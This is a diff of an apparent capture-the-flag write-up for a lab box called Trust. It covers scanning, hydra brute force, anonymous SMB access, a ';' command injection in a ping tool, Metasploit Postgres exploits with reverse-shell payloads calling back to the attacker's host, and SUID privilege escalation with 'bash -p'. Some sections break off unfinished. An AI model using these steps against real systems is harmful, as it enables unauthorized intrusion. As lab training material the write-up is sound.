@@ -2,7 +2,7 @@
 
 # Trust
 
-Welcome to the Trust write up. 
+Welcome to the Trust write up.
 
 - [Trust](#trust)
   - [Recon Phase](#recon-phase)
@@ -32,13 +32,13 @@ Welcome to the Trust write up.
 ## Recon Phase
 
 like every good spy movie, we need to recon the target. During the Recon Phase,
- the focus is on passive information gathering to understand the target's 
- environment without directly interacting with it. This involves collecting 
- publicly available data such as domain names, IP addresses, email addresses, 
- employee information, and social media profiles associated with the target 
- organization. Techniques such as open-source intelligence (OSINT), 
- DNS enumeration, WHOIS queries, and reconnaissance tools aid in gathering 
- this information.
+the focus is on passive information gathering to understand the target's
+environment without directly interacting with it. This involves collecting
+publicly available data such as domain names, IP addresses, email addresses,
+employee information, and social media profiles associated with the target
+organization. Techniques such as open-source intelligence (OSINT),
+DNS enumeration, WHOIS queries, and reconnaissance tools aid in gathering
+this information.
 
 ![selfie with the PwnToOwn machine](../../Assets/)
 
@@ -47,28 +47,27 @@ like every good spy movie, we need to recon the target. During the Recon Phase,
 ![Flyer with details of the PwnToOwn challenge](../../)
 
 The flyer gave us a QR code that goes to the PwnToOwn page. This has lot of
-details about the challenge. 
+details about the challenge.
 
 - We need to connect to the WIFI to even see the PwnToOwn machine.
 - WIFI SSID = `PwnToOwn`, WIFI Password = `ZTW2024!`
 - There are many of the same two boxes hosted on the machine.
-- The box seems to be hosted on the end of the subnet. 
+- The box seems to be hosted on the end of the subnet.
 - IP of the boxes ranges from `10.0.0.` to `10.0.0.253`
 - Need to submit to the leader board that is hosted on `http://10.0.0.14:80`
-    
 
 ## Enumeration Phase
 
-During the Enumeration Phase of a penetration test, the goal is to gather as 
-much information as possible about the target network or system. This involves 
-actively probing the target to identify potential vulnerabilities, 
-misconfigurations, or weaknesses. Techniques such as port scanning, service 
-identification, banner grabbing, and OS fingerprinting are commonly employed 
+During the Enumeration Phase of a penetration test, the goal is to gather as
+much information as possible about the target network or system. This involves
+actively probing the target to identify potential vulnerabilities,
+misconfigurations, or weaknesses. Techniques such as port scanning, service
+identification, banner grabbing, and OS fingerprinting are commonly employed
 to enumerate the target's infrastructure.
 
-Since we have a list of active machines on the network. We can now pick the 
-machines, that we can attack because of the recon phase we that there are 
-duplicates of the boxes. In this write up we are going to pick `10.0.0.248` 
+Since we have a list of active machines on the network. We can now pick the
+machines, that we can attack because of the recon phase we that there are
+duplicates of the boxes. In this write up we are going to pick `10.0.0.248`
 as our zero machine.
 
 ```bash
@@ -76,10 +75,10 @@ sudo nmap -A -p- -sS  10.0.0.248
 ```
 
 - `-A` - Enable OS detection, version detection, script scanning, and traceroute
-- `-sS` - This option tells nmap to only complete half of the three-way this 
-- will tell ports are open because an open port will send a SYN-ACK back to 
- nmap.
-- `-p-` - Tells nmap to check every port from 1-65535. This will check every 
+- `-sS` - This option tells nmap to only complete half of the three-way this
+- will tell ports are open because an open port will send a SYN-ACK back to
+  nmap.
+- `-p-` - Tells nmap to check every port from 1-65535. This will check every
   port that can possibly be opened.
 
 **Results:**
@@ -91,7 +90,7 @@ Host is up (0.0047s latency).
 Not shown: 65529 closed tcp ports (reset)
 PORT     STATE SERVICE     VERSION
 22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 4c:70:f1:60:2c:c3:fc:35:15:b0:5e:d5:bb:e2:39:5e (ECDSA)
 |_  256 3f:b0:81:ab:6e:5f:dc:6a:33:fd:68:2d:52:8e:db:4c (ED25519)
 80/tcp   open  http        nginx 1.18.0 (Ubuntu)
@@ -101,7 +100,7 @@ PORT     STATE SERVICE     VERSION
 445/tcp  open  netbios-ssn Samba smbd 4.6.2
 666/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
 |_http-server-header: Apache/2.4.52 (Ubuntu)
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/
 | http-title: Login :: Threatlocker Not Vulnerable Web App
 |_Requested resource was login.php
@@ -121,10 +120,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: 5m15s
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2024-02-20T20:31:12
 |_  start_date: N/A
 |_nbstat: NetBIOS name: TRUST, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
@@ -135,7 +134,6 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.32 seconds
-
 ```
 
 From this scan we can tell a few things right off the bat, Like it is an
@@ -144,19 +142,20 @@ server.
 
 ### SSH
 
-`SSH` is on of the most command port open on linux machine. Secure Shell or 
-common referred to as `SSH` is a way to remotely connect to a system. Unlike 
-Remote Desktop protocol `RDP`, `SSH` is only a terminal interface. 
+`SSH` is on of the most command port open on linux machine. Secure Shell or
+common referred to as `SSH` is a way to remotely connect to a system. Unlike
+Remote Desktop protocol `RDP`, `SSH` is only a terminal interface.
 
-Since we got the version from nmap we can use any search engine to look for 
-exploits. Unfortunately it seems like there are no exploit for openssh 
+Since we got the version from nmap we can use any search engine to look for
+exploits. Unfortunately it seems like there are no exploit for openssh
 version 8.9p1.
 
 Another thing we can try to use brute force the user and passwords. There are
-too many tool for brute forcing. To name a few: 
+too many tool for brute forcing. To name a few:
+
 - `Hydra`
 - `John the ripper`
-  
+
 We will try hydra, We will use this command:
 
 ```bash
@@ -164,14 +163,14 @@ hydra -L <USER FILE> -P <PASSWORD FILE> <IP> ssh -t 4
 ```
 - `-L` - This would be a text file that has a list of possible usernames for
   `ssh`.
-- `-P` - This would be a text file that has a list of possible passwords for 
+- `-P` - This would be a text file that has a list of possible passwords for
   `ssh`.
   > NOTE: the lowercase `-l` and `-p` will only do one username or password.
 - `<IP>` - this will be the target machine that we will lunch the attack
   against.
-- `ssh` - This tells hydra that we are attack port 22. 
+- `ssh` - This tells hydra that we are attack port 22.
 - `-t`  - This tells hydra how many parallel task we want to run. This will
-  basically run 4 hydras. 
+  basically run 4 hydras.
 
 When we run this, It will fail because the username and login are not basic
 username and passwords that can be found on a list.
@@ -194,51 +193,55 @@ look at the source code there does seem like there is anything else.
 
 `SMB` is very common for windows machine/computer, it is the main way to share
 file besides `FTP`. `SMB` tends to run on both 139 and 445. But sometime you
-will find only port 139 is open only. 
+will find only port 139 is open only.
 this is because 139 is for NetBIOS session, this was the main way for `SMB` to
 work before the newer version of SMB starting to use port 445. And modern
-version leave both open for backward compatibility. 
+version leave both open for backward compatibility.
 
 In the `namp` scan, it also show that port 139 and 445 is open. And the `SYN`
 scan show that it is the SMB service. We can use tools like `smbmap` or
-`enum4linux` to scan the `SMB` service/share. 
+`enum4linux` to scan the `SMB` service/share.
 
 #### Enum4linux
 
-To use `Enum4linux` you can use the following: 
+To use `Enum4linux` you can use the following:
 
 ```bash
 enum4linux -a <IP>
 ```
+
 Using this command will try to use known usernames and get you basic info about
 the `SMB`share. When we ran the scan we can even see the Temp share and what
 permission we have on that share. Another thing that the scan found was the
 password policy for the share. It even found a user called `alex`. The most
 important thing to know is that you can connect to the share with a anonymous
-user and that the only share we have access to is the `Temp` share.  
+user and that the only share we have access to is the `Temp` share.
 
 #### SMBmap
 
 To use `smbmap` you can use the following:
+
 ```bash
 smbmap -H <IP> -p <port>
 ```
+
 - `-H` - This tell `smbmap` what host to scan.
-- `-p` - This tell `smbmap` what port to scan. 
-  
+- `-p` - This tell `smbmap` what port to scan.
+
 When we run this scan it don't show as much as `enum4linux` did. But its a lot
 easy to ready what is on this share. The most important thing to know is that
 you can connect to the share with a anonymous user and that the only share we
-have access to is the `Temp` share.  
+have access to is the `Temp` share.
 
-#### Connecting to SMB 
+#### Connecting to SMB
 
 Now that we have some info about the `SMB` share, We can connect to the share
 with the anonymous user. We can use the one of follow to do that:
 
 ```bash
 smbclient --no-pass //<IP>/Temp
-``` 
+```
+
 OR
 
 ```bash
@@ -248,12 +251,13 @@ Once we connect to the `Temp` share, and use `dir` or `ls` we can see the
 following files:
 
 - Team1.log
-- Team.log 
+- Team.log
 
 Now we can use the `get` command to grab the files. And when we cat the
-files, we can see this. 
+files, we can see this.
 
 **Team.log**
+
 ```
 CEO: Our site just got hacked.
 
@@ -263,7 +267,7 @@ CEO: I want a better web server by monday end of day.
 
 Alex: I can only have a basic one by monday, but can have it better by Friday.
 
-CEO: Ok, It better look good by Friday then.  
+CEO: Ok, It better look good by Friday then.
 
 Alex: What about the hacked web site?
 
@@ -276,9 +280,10 @@ ALEX: I will start the new web site up now and work on it though out the week.
 CEO: I want daily updates.
 
 ALEX: ok
-
 ```
+
 **Team1.log**
+
 ```
 I.T: Hey Alex did you open a web server?
 
@@ -294,27 +299,27 @@ I.T: You have a course that you need to complete by friday.
 
 Alex: ( ;-;) ok
 ```
+
 The two files seems to be logs for the microsoft teams chat for a person named
-Alex.
-From the files we now know that happen to the website that was on port 80 and
-that there is another web server active. This new website might have a login
-page with the username and password being `admin:password`.
+Alex. From the files we now know that happen to the website that was on port
+80 and that there is another web server active. This new website might have a
+login page with the username and password being `admin:password`.
 
 ### HTTP 666
 
 From the `nmap` scan, this port might be a another web server and this would be
 kinda confirm with the messages form the `SMB` share. Now when we connect to
-the port with a web browser we get this page. 
+the port with a web browser we get this page.
 
 ![Web server on port 666](../../Assets/PwnToOwn/Webserverport666.png)
 
 Even though the the username and password might have change it never hurt to
-try it. So when we try the `admin:password` and get into the site. 
+try it. So when we try the `admin:password` and get into the site.
 
 ![After logging to the login page](../../Assets/PwnToOwn/afterloginport666.png)
 
-All we can do is say that alex is going to get fired soon. 
-exploring the site we can see that it have a ping utility tool on the site. 
+All we can do is say that alex is going to get fired soon.
+exploring the site we can see that it have a ping utility tool on the site.
 
 ![Ping tool on the web page](../../Assets/PwnToOwn/port666pingtool.png)
 
@@ -328,59 +333,64 @@ have a command injection. we can test this by a few ways.
 5. Add `||` to the end of the end of the IP
 
 **Example**
+
 ```bash
 127.0.0.1 | <COMMMAND>
 ```
 
 We can should use a command that is on every linux machine, `ls` command will
 work. so when we run this.
+
 ```bash
 -c 1 127.0.0.1 ; ls
 ```
+
 - `-c 1` - This will tell the ping command to only send one ICMP packet, inside
   of four packets.
-- `127.0.0.1` - This is the ip that the ping command will try to ping. 
-  > Note: 127.0.0.1 is the for local host. SO it will try to ping itself. 
+- `127.0.0.1` - This is the ip that the ping command will try to ping.
+  > Note: 127.0.0.1 is the for local host. SO it will try to ping itself.
 - `;` This will tell the web server to run the next command.
 - `ls` This will list the current directory.
-  
-So when we run the command, we will get this. 
+
+So when we run the command, we will get this.
 
 ![Results for Command injection test](../../Assets/PwnToOwn/pingresults.png)
 
-From this we know that command injection works and now we can more the the [Exploitation phase](#exploitation-phase) of the CTF.
+From this we know that command injection works and now we can more the the
+[Exploitation phase](#exploitation-phase) of the CTF.
 
 ### Postgres 5432
 
 Postgresql is most used on the back end and in most cases it would be install
 on a different server due to security. The default port is 5432. Since we don't
 have a way to interact with it normally like a website to interact with it
-without a user and password. We will might have to brute force into the
-database.
+without a user and password. We will might have to brute force into the database.
 
 There two main way you can do this:
 
 #### Metasploit way
 
-With Metasploit we can use some enumeration tools to scan the postgres service. 
+With Metasploit we can use some enumeration tools to scan the postgres service.
 We need to start up metaspolit with this command:
-```bash 
-msfconsole 
+
+```bash
+msfconsole
 ```
 
-Once it start we can search for anything with the keyword `postgres`
-These should be the results
+Once it start we can search for anything with the keyword `postgres` These should
+be the results
 
 ![msf search postgress](../../Assets/PwnToOwn/msfsreach.png)
 
 we should look that the following:
+
 - auxiliary/admin/postgres/postgres_login
-- auxiliary/admin/postgres/postgres_sql 
+- auxiliary/admin/postgres/postgres_sql
 - auxiliary/scanner/postgres/postgres_hashdump
 - auxiliary/scanner/postgres/postgres_schemadump
 
-When we select the postgres_login by using `use 9` and do `show options` or 
-`options` both will show what arguments you can use. 
+When we select the postgres_login by using `use 9` and do `show options` or
+`options` both will show what arguments you can use.
 
 Now all we have to do is set `RHOSTS` and `RPORT` These two settings stand for
 remote host and remote port and now we just have to run the auxiliary module.
@@ -390,76 +400,76 @@ set RHOSTS <IP>
 set RPORT 5432
 exploit
 ```
-> Note: You can use the `setg` command insde of `set`. `setg` will set value 
-> you give it and set as a global setting.  
+
+> Note: You can use the `setg` command insde of `set`. `setg` will set value
+> you give it and set as a global setting.
 
 After running this the postgres module, we found that the postgres is using the
 default credentials `postgres:postgres`. Now we could look for some exploits.
-Metasploits make this part SUPER easy with some modules that come with a check 
+Metasploits make this part SUPER easy with some modules that come with a check
 functions.
 
-You can use the full path like 
+You can use the full path like
 
 ```bash
-use exploit/multi/http/manage_engine_dc_pmp_sqlinkViewFectchServlet.dat 
-``` 
-OR 
+use exploit/multi/http/manage_engine_dc_pmp_sqlinkViewFectchServlet.dat
+```
+
+OR
 
 ```bash
 use 2
 ```
 
-If you have been using the `setg` command then you shouldn't need to reset the 
-`rhosts` and `rport`. Once you have everything thing set you can now use the 
+If you have been using the `setg` command then you shouldn't need to reset the
+`rhosts` and `rport`. Once you have everything thing set you can now use the
 `check` command, If the module you selected have a check function, `msf` will
 run the check.
 
-After a while you should have that the `copy from program cmd exec` and 
-`create lang` could be vulnerable. 
+After a while you should have that the `copy from program cmd exec` and
+`create lang` could be vulnerable.
 
 Now we can move on to the exploit phase of the attack. [Exploit Phase](#exploitation-phase)
 
-#### Manual way 
+#### Manual way
 
 Manual way is a lot harder but it can be done. The first thing we can do is to
-Google how to even connect to the database by it self. Since normally you have 
-someway to interact with it without a `user` and `password`. 
+Google how to even connect to the database by it self. Since normally you have
+someway to interact with it without a `user` and `password`.
 
-After some googling you might have come across that the default user and 
-password is `postgres:postgres`. It never hurt to try default credentials we 
+After some googling you might have come across that the default user and
+password is `postgres:postgres`. It never hurt to try default credentials we
 can do this by using `psql` command:
 
 ```bash
 psql -h 10.0.0.248 -U postgres -W postgres -P 5432
 ```
 
-After running the command. you should have a connection with the postgres. 
+After running the command. you should have a connection with the postgres.
 now that we are in the database what can we do?
 
 ```bash
-SELECT lanname,lanpltrusted,lanacl FROM pg_language;  
+SELECT lanname,lanpltrusted,lanacl FROM pg_language;
 ```
 
-When we run this command we can see that we have python3 enable. And a lot of 
-google there is a might be a exploit that we can use and its called, 
+When we run this command we can see that we have python3 enable. And a lot of
+google there is a might be a exploit that we can use and its called,
 `Copy from program cmd exec` exploit. But this exploit needs `metasploit`
 
-Now we can move on to the exploit phase of the attack. [Exploit Phase](#exploitation-phase)
+Now we can move on to the exploit phase of the attack.
+[Exploit Phase](#exploitation-phase)
 
 > Note: that the create lang was not talk about in the manual way.
-> As its hard to find without automated tools. 
+> As its hard to find without automated tools.
 
 ## Exploitation Phase
 
 ### HTTP 666
 
-Now that we know that the ping tool on the site can be a command injection 
+Now that we know that the ping tool on the site can be a command injection
 point. now we we can see. what can we do. when we run `whoami` we get www-data
-user. We can even look 
- 
+user. We can even look
 
-
- 
 ### Postgres 5432
 
 Okay now that we have two exploit that might work. Which even you chose
@@ -469,22 +479,27 @@ we will explain how to use both exploits.
 
 `Copy from program cmd exec` exploits works by creating a new table and then copy
 the reverse shell payload and then output the table to run the exploit. Then
-the exploit will clean of any tables it made to hide any evidence. 
+the exploit will clean of any tables it made to hide any evidence.
 
 To start with is to start up metasploit.
+
 ```bash
 msfconsole
 ```
 
 Then can use the exploit, with this:
+
 ```bash
 use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
 ```
-Now we can set our payload with this 
+
+Now we can set our payload with this
+
 ```bash
 show payloads
 ```
-this will show all compatible payloads and will will use the 
+
+this will show all compatible payloads and will will use the
 `cmd/unix/reverse_perl` shell
 
 ```bash
@@ -492,7 +507,6 @@ set payload cmd/unix/reverse_perl
 ```
 
 Now all we have to do is to set all the settings for exploit.
-
 
 ```bash
 msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options
@@ -527,9 +541,9 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-
 ```
-Using the `show options` or `options` command we can see that we need to 
+
+Using the `show options` or `options` command we can see that we need to
 change the `RHOSTS` and `LHOST`
 
 ```bash
@@ -538,27 +552,26 @@ RHOSTS => <remote IP>
 msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST <our IP>
 LHOST => <our IP>
 ```
+
 Now we can use our exploit. With the exploit command.
 ![running exploit](../../Assets/PwnToOwn/msfcmdexecexploit.png)
 
 Now we have our shell and we are login as the `postgres` user. After looking
 around we seem like we can't do much.
 
-
-
 #### Create Lang
 
-The `Create lang` exploit works because we can exploit the create language 
-function to allow external scripting language function. Basically the 
+The `Create lang` exploit works because we can exploit the create language
+function to allow external scripting language function. Basically the
 exploit is creating a new function with our exploit and then running it.
 
 We need to select the exploit with this command
 
 ``` bash
-use exploit/multi/postgres/postgres_createlang 
+use exploit/multi/postgres/postgres_createlang
 ```
 
-now we need to find a good payload with 
+now we need to find a good payload with
 
 ```bash
 show payloads
@@ -573,11 +586,6 @@ set payload payload/cmd/unix/python/meterpreter/bind_tcp
 
 Now that we have out payload we need to configure the settings.
 
-
-
-
-
-
 ## Privilege Escalation
 
 Now that we are the on the system as www-data or postgres, You notice that
@@ -585,14 +593,14 @@ don't have a lot access, and we can't find a Flag.txt file anywhere, where we
 have access. This means that we need to do a escalate our privilege. There is a
 few ways to get more privilege:
 
-1. take over a vulnerable application that have more access then we have. 
+1. take over a vulnerable application that have more access then we have.
 2. find an SUID
 
 > Note: There is a lot more way to escalate privilege but that could be its own
 > class.
 
 SUID are one the most easy box to check for privilege escalation. There are two
-way to find SUID 
+way to find SUID
 1. linpeas https://github.com/carlospolop/PEASS-ng
 2. manual way
 
@@ -604,7 +612,7 @@ now is not as common but it was a thing. so the way we can tell is with the
 ![SUID example](../../Assets/PwnToOwn/SUID.png)
 
 You can see that there is an `s` where an `x` should be if SUID was disable on
-the su command. 
+the su command.
 
 ### Linpeas
 
@@ -613,7 +621,7 @@ Linpeas is very good at finding any privilege escalation method on a linux.
 > Note: Don't think you are safe on windows computer too soon, because there
 > is also Winpeas which is the linpeas of windows.
 
-The first thing to do to get linpeas on our computer or on the machine. 
+The first thing to do to get linpeas on our computer or on the machine.
 
 If you are in kali then you can use this:
 ```bash
@@ -621,13 +629,13 @@ wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023
 ```
 #### If you don't have internet on the when you are on the reverse shell.
 
-If the Machine you are attacking is not on the internet then you wil have to 
-get linpeas on your main machine. 
- 
+If the Machine you are attacking is not on the internet then you wil have to
+get linpeas on your main machine.
+
 ### Manual Way
 
-The manual way is going to be a lot more work but that is ok. 
-We can use the following command to check if there is SUID set on a program. 
+The manual way is going to be a lot more work but that is ok.
+We can use the following command to check if there is SUID set on a program.
 
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
@@ -641,18 +649,17 @@ Now that we have a list of programs that an SUID set we can go to the GTFO
 website https://gtfobins.github.io/
 
 Get the F**K out (GTFO) site is a site that have a list of programs that can
-give you a privilege escalation method. 
+give you a privilege escalation method.
 
-
-bash -p 
+bash -p
 
 Now we should have root and we can this by using the `whoami` command.
 
 ![Whoami command](../../Assets/PwnToOwn/root.png)
 
 Now that we have root we can move on to getting the flag.
- 
-## Getting The Flag 
+
+## Getting The Flag
 
 Now that we are in as root of the system now we can navigate the system. After
 a while of look we will find the `/home/alex/` folder with the `Flag.txt` file
@@ -662,15 +669,12 @@ and when we cat the `Flag.txt` we get the following:
 ZTW{LINUXqggieliywxzqplgalrexiiesssfpvicf}
 ```
 
-Now that we have the flag all we need to do is to go to the leader board and 
+Now that we have the flag all we need to do is to go to the leader board and
 submit the flag.
 
-
-
 # References
+
 GTFO https://gtfobins.github.io/
-
-
 
 HTTP Port 80
 Http 666
